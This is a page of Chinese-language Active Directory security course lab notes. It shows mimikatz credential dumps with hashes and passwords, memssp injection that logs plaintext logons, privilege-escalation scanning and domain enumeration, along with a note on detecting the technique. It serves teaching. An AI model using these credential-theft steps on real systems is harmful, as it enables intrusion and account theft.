</span></span><span style=display:flex><span>Domain            : Font Driver Host
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:20
</span></span><span style=display:flex><span>SID               : S-1-5-96-0-0
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma.org
</span></span><span style=display:flex><span>         * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>46347</span> <span style=color:#f92672>(</span>00000000:0000b50b<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User Name         : UMFD-1
</span></span><span style=display:flex><span>Domain            : Font Driver Host
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:20
</span></span><span style=display:flex><span>SID               : S-1-5-96-0-1
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma.org
</span></span><span style=display:flex><span>         * Password : maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>45411</span> <span style=color:#f92672>(</span>00000000:0000b163<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : UndefinedLogonType from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Domain            : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:17
</span></span><span style=display:flex><span>SID               :
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>         <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
</span></span><span style=display:flex><span>         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>999</span> <span style=color:#f92672>(</span>00000000:000003e7<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Session           : UndefinedLogonType from <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>User Name         : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>Domain            : kuma
</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Logon Time        : 2023/9/5 上午 12:22:17
</span></span><span style=display:flex><span>SID               : S-1-5-18
</span></span><span style=display:flex><span>        msv :
</span></span><span style=display:flex><span>        tspkg :
</span></span><span style=display:flex><span>        wdigest :
</span></span><span style=display:flex><span>         * Username : DESKTOP-G95U93T$
</span></span><span style=display:flex><span>         * Domain   : kuma
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        kerberos :
</span></span><span style=display:flex><span>         * Username : desktop-g95u93t$
</span></span><span style=display:flex><span>         * Domain   : KUMA.ORG
</span></span><span style=display:flex><span>         * Password : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        ssp :
</span></span><span style=display:flex><span>        credman :
</span></span><span style=display:flex><span>        cloudap :
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/>NTUSTISC - AD Note - Lab(利用弱點)</a></h2><div class=text-small><a href=/tags/information-security/>Information Security</a>,
<a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a></div><p><h1 id=ntustisc---ad-note---lab利用弱點>NTUSTISC - AD Note - Lab(利用弱點)
<a class=anchor href=#ntustisc---ad-note---lab%e5%88%a9%e7%94%a8%e5%bc%b1%e9%bb%9e>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;t=3600">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://zhuanlan.zhihu.com/p/145430397>Internet Information Services(IIS)</a><blockquote><p>IIS是縮寫，全稱Internet Information Services ( IIS,互聯網信息服務 ),是由微軟公司提供的基於運行Microsoft Windows的互聯網基本服務。</p><p>IIS是指World Wide Web server服務，IIS是一種Web（網頁）服務組件，專業的說，IIS可以賦予一部主機電腦一組以上的IP地址，而且還可以有一個以上的域名作為Web網站。做過服務器配置的都應該知道IIS。制作好了網站怎麽才能讓別人瀏覽，就是通過網站服務器來實現的。IIS只是網站服務器的一種而已。</p><h3 id=簡單來說>簡單來說：
<a class=anchor href=#%e7%b0%a1%e5%96%ae%e4%be%86%e8%aa%aa>#</a></h3><p>Internet Information Service（IIS）是windows開設web網頁服務的組件，用來搭載網站運行程序的平台的。還能提供FTP，SMTP等服務。</p><p><font color=ff0000>在UNIX或Linux平台上，Apache就是網站服務器。</p><p>而對於Windows NT/2000來說，IIS就是標準的網站服務器。</font></p><p>IIS是一種服務，是Windows 2000 Server系列的一個組件。不同於一般的應用程序，它就像驅動程序一樣是操作系統的一部分，具有在系統啟動時被同時啟動的服務功能。
如果想知道如何在win10啟用IIS或是建置網站server，可以看這個影片<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p></blockquote></li><li>一般權限(就像前面的lab那樣)<ul><li>取得網域使用者資訊</li><li>Scan Port</li><li>Check Group Policy Object</li></ul></li><li>高權限好處<ul><li>Dump Password or Hash</li><li>Turn off Defender</li><li>Check the other users&rsquo; info</li></ul></li><li>本地特出使用者<ul><li>==NT Authority\System==(本地端真正的最高權限使用者)</li><li>NT Authority\Network Service</li><li>NT Authority\Local Service</li><li>NT Authority\IUSR</li></ul></li><li>提權方法<ul><li>利用弱點(通常是直接用Windows CVE直接打看看)，可參考<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></li><li>Hijack Token</li><li>Guess Password
就像前面環境觀察中提到的一樣，可以從<code>Active Directory Users and Computers</code>的description中看看有沒有密碼的提示，或是查看<code>$ net user</code>變更密碼的時間是哪時候，然後考慮爆破<ul><li>Local Admin比Domain Admin好拿</li><li>通常是固定密碼<ul><li>所有主機都相同</li><li>可能很多人知道</li><li>弱密碼</li><li>系統初始化包</li></ul></li><li>Solution: 可以參考<a href=https://learn.microsoft.com/zh-tw/windows-server/identity/laps/laps-overview>本機系統管理員密碼解決方案(LAPS)</a></li></ul></li><li>管理服務</li><li>錯誤配置</li></ul></li></ul><h2 id=lab-time---本地提權>Lab Time - 本地提權
<a class=anchor href=#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a>#</a></h2><h3 id=利用弱點>==利用弱點==
<a class=anchor href=#%e5%88%a9%e7%94%a8%e5%bc%b1%e9%bb%9e>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/bitsadmin/wesng.git --depth <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>$ cd wesng
</span></span><span style=display:flex><span>$ python wes.py --update
</span></span><span style=display:flex><span>$ systeminfo.exe &gt; systeminfo.txt <span style=color:#75715e># 這條指令是windows內建的指令，所以一定要在cmd中操作</span>
</span></span><span style=display:flex><span>$ python wes.py systeminfo.txt
</span></span></code></pre></div><p>:::spoiler Result</p><a href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/>NTUSTISC - AD Note - Lab(查詢本地使用者)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab查詢本地使用者>NTUSTISC - AD Note - Lab(查詢本地使用者)
<a class=anchor href=#ntustisc---ad-note---lab%e6%9f%a5%e8%a9%a2%e6%9c%ac%e5%9c%b0%e4%bd%bf%e7%94%a8%e8%80%85>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=查詢本地使用者>==查詢本地使用者==
<a class=anchor href=#%e6%9f%a5%e8%a9%a2%e6%9c%ac%e5%9c%b0%e4%bd%bf%e7%94%a8%e8%80%85>#</a></h3><p>常用的cheat sheet</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ net user
$ net user &lt;username&gt;
</code></pre><p>:::spoiler Implementation</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ net user

\\DESKTOP-G95U93T 的使用者帳戶

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
low                      user                     WDAGUtilityAccount
命令已經成功完成。
$ net user administrator
使用者名稱             Administrator
全名
註解                   管理電腦/網域的內建帳戶
使用者的註解
國家/區域碼            000 (系統預設值)
帳戶使用中             Yes
帳戶到期               從不

上次設定密碼           ‎2021/‎9/‎28 下午 10:10:39
密碼到期               從不
可變更密碼             ‎2021/‎9/‎28 下午 10:10:39
請輸入密碼             Yes
使用者可以變更密碼     Yes

容許的工作站           全部
登入指令檔
使用者設定檔
主目錄
上次登入時間           ‎2023/‎8/‎26 上午 12:48:36

可容許的登入時數       全部

本機群組會員           *Administrators
全域群組會員           *None
命令已經成功完成。
</code></pre><p>:::</p><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/>NTUSTISC - AD Note - Lab(查詢網域群組)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab查詢網域群組>NTUSTISC - AD Note - Lab(查詢網域群組)
<a class=anchor href=#ntustisc---ad-note---lab%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e7%be%a4%e7%b5%84>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=查詢網域群組>==查詢網域群組==
<a class=anchor href=#%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e7%be%a4%e7%b5%84>#</a></h3><p>常用的cheat sheet
<code>Domain Admins</code>, <code>Schema Admins</code>, <code>Enterprise Admins</code>是預設的權限，通常一進到AD網域都會先看這幾個權限有哪些成員</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ net groups /domain # 查詢網域中群組的資料
$ net groups &#34;Domain Admins&#34; /domain
$ net groups &#34;Schema Admins&#34; /domain
$ net groups &#34;Enterprise Admins&#34; /domain
</code></pre><p>:::spoiler Implementation</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ net groups /domain
</span></span><span style=display:flex><span>這項要求會在網域 kuma.org 下的網域控制站處理。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>\\</span>WIN-818G5VCOLJO.kuma.org 的群組帳戶
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>*accounting
</span></span><span style=display:flex><span>*Cloneable Domain Controllers
</span></span><span style=display:flex><span>*DnsUpdateProxy
</span></span><span style=display:flex><span>*Domain Admins
</span></span><span style=display:flex><span>*Domain Computers
</span></span><span style=display:flex><span>*Domain Controllers
</span></span><span style=display:flex><span>*Domain Guests
</span></span><span style=display:flex><span>*Domain Users
</span></span><span style=display:flex><span>*Enterprise Admins
</span></span><span style=display:flex><span>*Enterprise Key Admins
</span></span><span style=display:flex><span>*Enterprise Read-only Domain Controllers
</span></span><span style=display:flex><span>*Executives
</span></span><span style=display:flex><span>*Group Policy Creator Owners
</span></span><span style=display:flex><span>*IT Admins
</span></span><span style=display:flex><span>*Key Admins
</span></span><span style=display:flex><span>*marketing
</span></span><span style=display:flex><span>*Office Admin
</span></span><span style=display:flex><span>*Project management
</span></span><span style=display:flex><span>*Protected Users
</span></span><span style=display:flex><span>*Read-only Domain Controllers
</span></span><span style=display:flex><span>*sales
</span></span><span style=display:flex><span>*Schema Admins
</span></span><span style=display:flex><span>*Senior management
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span><span style=display:flex><span>$ net groups <span style=color:#e6db74>&#34;Domain Admins&#34;</span> /domain
</span></span><span style=display:flex><span>這項要求會在網域 kuma.org 下的網域控制站處理。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>群組名稱     Domain Admins
</span></span><span style=display:flex><span>註解         Designated administrators of the domain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>成員
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span><span style=display:flex><span>$ net groups <span style=color:#e6db74>&#34;Schema Admins&#34;</span> /domain
</span></span><span style=display:flex><span>這項要求會在網域 kuma.org 下的網域控制站處理。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>群組名稱     Schema Admins
</span></span><span style=display:flex><span>註解         Designated administrators of the schema
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>成員
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span><span style=display:flex><span>$ net groups <span style=color:#e6db74>&#34;Enterprise Admins&#34;</span> /domain
</span></span><span style=display:flex><span>這項要求會在網域 kuma.org 下的網域控制站處理。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>群組名稱     Enterprise Admins
</span></span><span style=display:flex><span>註解         Designated administrators of the enterprise
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>成員
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>Administrator
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span></code></pre></div><p>可以看到目前這三個預設的群組，都只有Administrator在裡面而已
:::</p><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</a></h2><div class=text-small><a href=/tags/information-security/>Information Security</a>,
<a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a></div><p><h1 id=ntustisc---ad-note---lab無法reboot的時盜取passwd>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)
<a class=anchor href=#ntustisc---ad-note---lab%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來</p><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=無法reboot的時盜取passwd>==無法Reboot的時盜取Passwd==
<a class=anchor href=#%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd>#</a></h3><ol><li>Inject memssp
記得用系統管理員權限開mimikatz<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mimikatz <span style=color:#75715e># privilege::debug</span>
</span></span><span style=display:flex><span>Privilege <span style=color:#e6db74>&#39;20&#39;</span> OK
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># misc::memssp</span>
</span></span><span style=display:flex><span>Injected <span style=color:#f92672>=)</span>
</span></span></code></pre></div></li><li>Relogin
重新登出再登入才會看到</li><li>Result
在<code>C:\Windows\System32\mimilsa.log</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f7c0f<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f7c0f<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f80d1<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f80d1<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f80e8<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001f80e8<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\D</span>ESKTOP-G95U93T$	maj<span style=color:#e6db74>&#34;2g&lt;h(&amp;iQZ7kqFHQ4X&amp;c;_wQq3V;*gq.(A=4&amp;)\2eesNp8S=W)C,&#34;</span>nM:ns?6m.%;K4+CSGDFew&gt;VaNQ;N_<span style=color:#f92672>)</span>?mB1<span style=color:#ae81ff>\P</span>9udE7Gs<span style=color:#e6db74>&#39;Lsr ccxo*CyL=JdK&#34;&#39;</span>kF
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc7f9<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc7f9<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc85a<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc85a<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc7f9<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000:001fc7f9<span style=color:#f92672>]</span> kuma<span style=color:#ae81ff>\b</span>ear	1qaz@WSX3edc
</span></span></code></pre></div>可以看到這個log file用明文的方式新增了我們剛剛打入的密碼</li></ol><h3 id=how-to-detect-it>==How to detect it?==
<a class=anchor href=#how-to-detect-it>#</a></h3><p>一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間</p><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/>NTUSTISC - AD Note - Lab(環境調查BloodHound)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab環境調查bloodhound>NTUSTISC - AD Note - Lab(環境調查BloodHound)
<a class=anchor href=#ntustisc---ad-note---lab%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5bloodhound>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://medium.com/renee0918/how-to-protect-windows-global-event-c19bba0ce890>[Windows Programming] IPC 通知機制與安全設定</a></p><blockquote><p>當系統中需要同步處理某些資源的存取權時，可以使用 Windows 的同步處理物件協調不同 process 間對於共同資源的互動，Windows 提供的同步處理物件有四種，分別是: Event, Mutex, Semaphore, Waitable timer，本篇只會提到 Event 喔！</p><p>假設系統中有兩個 process：process A 得等待 process B 完成某些特定工作後才能繼續執行。windows 提供的 event 機制能讓 process B 完成工作後發出訊號通知 process A，而 process A 則進入等待狀態直到接受到訊號後才繼續執行後續工作。Process 間只需定好溝通的 event name 就可以輕鬆達成跨程序間的通訊 (Inter-process communication : IPC)，正因為簡單好實現的特性，event 常被用在程序間的溝通與同步。</p></blockquote><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=bloodhound-ad>BloodHound AD
<a class=anchor href=#bloodhound-ad>#</a></h3><ul><li>說明: 環境調查的視覺化工具</li><li>版本: 4.0.3
:::info
